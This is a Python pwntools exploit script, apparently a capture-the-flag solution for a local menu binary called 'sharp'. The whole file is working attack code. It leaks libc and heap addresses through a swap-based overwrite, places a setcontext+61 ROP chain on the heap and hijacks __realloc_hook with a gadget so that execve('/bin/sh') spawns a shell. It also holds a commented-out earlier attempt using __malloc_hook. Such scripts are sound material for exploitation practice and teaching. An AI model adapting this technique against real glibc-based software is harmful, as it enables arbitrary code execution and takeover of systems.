from pwn import *

r = process("./sharp")
#gdb.attach(r)
r.recvuntil(b'>')



def add(username):
	r.sendline(b'1')
	r.recvuntil(b'Enter username:')
	r.sendline(username)
	r.recvuntil(b'>')


def remove(index):
	r.sendline(b'2')
	r.recvuntil(b'to remove:')
	r.sendline(str(index))
	r.recvuntil(b'>')

def edit(index, newname):
	r.sendline(b'3')
	r.recvuntil(b'to edit:')
	r.sendline(index)
	r.recvuntil(b'Enter new username:')
	r.sendline(newname)
	r.recvuntil(b'>')

def swap(i1, i2):
	r.sendline(b'4')
	r.recvuntil(b'to swap:')
	r.sendline(i1)
	r.recvuntil(b'to swap with:')
	r.sendline(i2)
	r.recvuntil(b'>')

def list():
	r.sendline(b'5')
	result = r.recvuntil(b'>')
	return result


add(b"0000\x00aaaa")  # 0 - testing \x00 byte and it works :haha
add(b'1111')  # 1
add(b'2222')  # 2

free_got = 0x0000000000403f90
free_off = 0x000000000009d850


# leak libc base
payload = b'1' + b'a'*(0x10-1) + p64(free_got)[:-1]
swap(b"0", payload)

list()
stuff = list().split(b"\nEntry: 2")[0][-6:]
stuff = int.from_bytes(stuff, "little")
libc_base = stuff - free_off


''' old plan, use one_gadget instead of system at both __malloc_hook and __realloc_hook - but still not working
system_off = 0x0000000000055410
system_addr = libc_base + system_off

malloc_hook_off = 0x00000000001ebb70
malloc_hook_addr = malloc_hook_off + libc_base

payload = b'1' + b'a'*(0x10-1) + p64(malloc_hook_addr - 3)[:-1]
swap(b"0", payload)
list()

payload = b'\x00'*3 + p64(system_addr)

edit(b'1', payload)
'''

# leak heap base
mp_off = 0x1eb280
mp_target = libc_base + mp_off + 72 + 1
payload = b'1' + b'a'*(0x10-1) + p64(mp_target)[:-1]
swap(b"0", payload)

list()

stuff = list().split(b'\nEntry: 2')[0].split(b' ')[-1]
heap_base = int.from_bytes(b'\x00' + stuff, "little")
print(hex(heap_base))

# gadget needed
setcontext_off = 0x0000000000580a0
setcontext_gadget = libc_base + setcontext_off + 61   # <setcontext + 61>
binsh_off = 0x1b75aa
binsh_addr = libc_base + binsh_off
pop_rax_ret = libc_base + 0x000000000004a550
# objdump -D -Mintel libc-2.31.so | grep -B 1 ret | grep -A 1 syscall | head -n 2
syscall_ret_off = 0x66229
syscall_ret_addr = libc_base + syscall_ret_off

# offset of chunk3 is 0x490
chunk3_addr = heap_base + 0x490
payload = p64(heap_base) # pass line 23 & 24 in edit_user function
payload += p64(chunk3_addr) # rdx will take this value
payload += b'A'*0x10 # padding
payload += p64(setcontext_gadget)

payload += p64(0)                 # <-- [rdx + 0x28] = r8
payload += p64(0)                 # <-- [rdx + 0x30] = r9
payload += b"A"*0x10              # padding
payload += p64(0)                 # <-- [rdx + 0x48] = r12
payload += p64(0)                 # <-- [rdx + 0x50] = r13
payload += p64(0)                 # <-- [rdx + 0x58] = r14
payload += p64(0)                 # <-- [rdx + 0x60] = r15
payload += p64(binsh_addr)      # <-- [rdx + 0x68] = rdi (ptr to '/bin/sh')
payload += p64(0)                 # <-- [rdx + 0x70] = rsi 
payload += p64(0)                 # <-- [rdx + 0x78] = rbp
payload += p64(0)                 # <-- [rdx + 0x80] = rbx
payload += p64(0)                 # <-- [rdx + 0x88] = rdx 
payload += b"A"*8                 # padding
payload += p64(0)                 # <-- [rdx + 0x98] = rcx 
payload += p64(chunk3_addr + 0xb0)      # <-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain
payload += p64(pop_rax_ret)           # <-- [rdx + 0xa8] = rcx, will be pushed to rsp
payload += p64(0x3b)              # execve 64-bit syscall
payload += p64(syscall_ret_addr)

# setting ROP in heap 
add(payload)


# swap to __realloc_hook
realloc_hook_off = 0x0000000001ebb68
realloc_hook_addr = libc_base + realloc_hook_off
payload = b'1' + b'a'*(0x10-1) + p64(realloc_hook_addr - 0x20 -3)[:-1]
swap(b"0", payload)

list()

# 0x0000000000154931 : mov edx, dword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
calling_off = 0x0000000000154931
calling_gadget = libc_base + calling_off

# overwrite __realloc_hook with calling_gadget
payload = b'\x00'*(0x20 + 3) + p64(calling_gadget)
edit(b'1', payload)


# edit the second heap chunk - where heap note address store 
# 0x2a0 = 0x4052a0 - 0x00405000
heap2 = heap_base + 0x2a0
payload = b'1' + b'a'*(0x10-1) + p64(heap2)[:-1]
swap(b"0", payload)

list()


# overwrite heap2 with chunk3_addr . because realloc will take this value as rdi
payload = p64(chunk3_addr)
edit(b'1', payload)

# trigger realloc
r.sendline(b'1')


r.interactive()

